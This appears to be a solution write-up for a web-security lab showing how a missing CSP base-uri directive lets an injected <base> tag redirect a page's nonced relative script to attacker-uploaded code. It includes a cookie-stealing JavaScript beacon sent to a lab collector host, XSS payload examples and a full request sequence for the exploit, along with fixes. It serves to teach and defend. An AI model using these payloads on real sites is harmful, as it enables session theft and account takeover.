# Solution — CSP Bypass via Missing base-uri Directive

## Vulnerability class

**CWE-79 · CWE-829 · OWASP A03:2021 – Injection** — an HTML injection contained by
a nonce-based CSP (`script-src 'nonce-…'`), defeated because the policy omits the
**`base-uri`** directive. An injected `<base>` repoints the page's own **nonced**
relative `<script src>` at attacker-controlled content; the nonce travels with the
element, so the redirected script loads with a valid nonce and runs.

## The setup

Relaydash's CSP is nonce-based and strict on `script-src`:

```
default-src 'self'; script-src 'nonce-<random-per-response>';
img-src * data:; connect-src *; style-src 'self' 'unsafe-inline'; object-src 'none'
```

and the page loads its bundle with a **relative, nonced** path:

```html
<head>
  <title>Relaydash</title>
  <!-- your ?ref= injection lands here -->
  <script src="main.js" nonce="<random-per-response>"></script>
</head>
```

The nonce is the whole point. `script-src` has **no `'unsafe-inline'`** and — this
is what makes the lab specifically about base-uri — **no `'self'`**. So _every_
script you could inject is blocked, because none of them carry the per-response
nonce:

| Reflected `?ref=` payload                                | Result                                 |
| -------------------------------------------------------- | -------------------------------------- |
| `<script>steal()</script>`                               | **blocked** — inline, no nonce         |
| `<img src=x onerror="steal()">`                          | **blocked** — inline handler, no nonce |
| `<script src="/u/<id>/main.js"></script>` (same-origin!) | **blocked** — no `'self'`, no nonce    |

The lab's negative control queues that **third** payload — a `<script src>`
pointing straight at attacker-uploaded same-origin content — and the collector
receives **zero** beacons. Under a nonce-only policy, even a same-origin script has
no way to run. The only script the CSP trusts is the page's own nonced
`<script src="main.js">`.

## Why base-uri is the only door

Two facts remain:

1. A **relative** URL (`main.js`) is resolved against the document's **base URL**.
2. The CSP has **no `base-uri`** directive. `script-src` says _which scripts may
   run_ (only the nonced ones); `base-uri` says _what the base URL may be set to_ —
   and it isn't there.

The nonce is an attribute on the **element**, not a property of the URL. So if you
can change _where_ the trusted `<script src="main.js">` resolves to — without
touching the element — it still carries its valid nonce and CSP still allows it.
That is exactly what a `<base>` does.

## The gadget: same-origin content you control

Relaydash serves uploaded scripts at `/u/<id>/main.js`:

```
POST /upload   {"js":"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie);"}
      →  {"id":"<id>", "path":"/u/<id>/main.js"}
```

On its own this is inert — you just saw a _direct_ `<script src="/u/<id>/main.js">`
get blocked by the nonce CSP. It becomes code execution only when the page's own
nonced script can be **pointed at it**.

## The bypass

Inject a `<base>` (a single tag, in `<head>`, **before** the script) that sets the
base URL to your upload's directory:

```
/?ref=<base href="/u/<id>/">
```

Now the page parses:

```html
<head>
  <title>Relaydash</title>
  <base href="/u/<id>/" />
  <!-- injected -->
  <script src="main.js" nonce="R"></script>
</head>
```

- `main.js` resolves against `http://app:8080/u/<id>/` → `/u/<id>/main.js`.
- The `<script>` element still carries the valid nonce `R`, so `script-src
'nonce-R'` permits it **regardless of where the src now points**.
- It loads **your** uploaded bundle, which runs in Relaydash's origin and beacons
  the admin's non-HttpOnly `session` cookie.

The trailing slash on `href="/u/<id>/"` matters: `<base href="/u/<id>">` (no slash)
resolves `main.js` to `/u/main.js`. The base URL is treated as a directory.

## End-to-end

```
# 0. (negative control) a DIRECT <script src> is blocked — 0 beacons.
POST /report {"url":"/?ref=<script src=\"/u/<ctrl>/main.js\"></script>"}

# 1. Upload the attacker bundle (served same-origin):
POST /upload   {"js":"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie);"}

# 2. Queue the <base> injection — it repoints the page's NONCED main.js:
POST /report   {"url":"/?ref=<base href=\"/u/<id>/\">"}    (URL-encoded)

# 3. Bot loads the page; the nonced main.js now resolves to /u/<id>/main.js and
#    runs (valid nonce travels with the element); it beacons the cookie.

# 4. Read the collector, submit the session:
GET  /oob/received            # /report?c=session%3D<32 hex>
POST /solve   {"c":"<32 hex>"}      →  FLAG{…}
```

`tests/exploit.py` automates this and enforces the negative control first: the
direct `<script src="/u/<id>/main.js">` must yield **0 beacons** (proving the nonce
blocks it), then the `<base>` path must solve — so the base-uri technique is the
_only_ way to the flag.

## Why the containment holds

- Collector + bot live on a `backend` network with `internal: true` — **no route
  off the host**. The stolen cookie reaches the in-lab collector but never the
  internet, so the lab ships a real cookie-theft primitive at `risk: low`.
- `/internal/bot-login` and `/internal/queue` are firewalled to the backend subnet
  (login also gated by `BOT_KEY`), so a public visitor cannot mint the admin cookie
  or read the queue and skip the XSS.
- Single gunicorn worker: the queue, uploads and admin session live in-process.

## The fix

1. **Set `base-uri 'none'` (or `'self'`) — the real fix.** It costs one token and
   makes a `<base>` injection inert: the relative `main.js` can only ever resolve
   against the real document URL, so the nonced script always loads the intended
   bundle. A `script-src` (nonce or otherwise) without a companion `base-uri` is an
   incomplete policy; the two belong together.
2. **Do not load first-party scripts by bare relative name.** Use an absolute path
   (`/main.js`) or, better, a full URL with **Subresource Integrity**
   (`<script src="/main.js" integrity="sha384-…">`) — SRI makes the browser reject
   any bytes that do not match the expected hash, so a repointed script fails even
   with base-uri missing.
3. **Encode the reflected output.** With `?ref=` HTML-escaped (autoescape on),
   there is no tag injection to place a `<base>` through in the first place.

## Design note — why the nonce (and not `'self'`)

An earlier draft of this lab used `script-src 'self'` with the same same-origin
upload gadget. That is **unsound**: because `'self'` permits _any_ same-origin
script, an attacker can inject `<script src="/u/<id>/main.js">` **directly** and
never touch `<base>` — the base-uri technique the lab teaches becomes optional. The
fix is a **nonce-based** `script-src` with **no `'self'`**: a direct `<script src>`
injection now has no valid nonce and is blocked, so redirecting the page's _own_
nonced script with `<base>` is the only path. This is also the real-world shape of
the bug — base-uri hijacks are a nonce-CSP problem (the nonce is what a host/`self`
restriction cannot express), and it is why `base-uri` exists as a directive.

## Deviation from the catalog stack

The catalogued scenario is a **Ruby/Sinatra** target that points `<base>` at a
_second attacker origin_. Under a **nonce** CSP that framing is actually viable (a
nonced script redirected to a foreign host still loads — the nonce, not the host,
authorises it), but it needs a second in-lab origin. This lab re-platforms to
**Flask** and keeps the redirected script **same-origin** (an attacker-uploaded
`/u/<id>/main.js`), which is self-contained and equally sound _given the nonce_ —
the nonce is what forecloses the direct-injection shortcut. The taught lesson — a
missing `base-uri` lets a `<base>` injection hijack a trusted relative script — is
identical. The Playwright verifier stands in for Puppeteer.
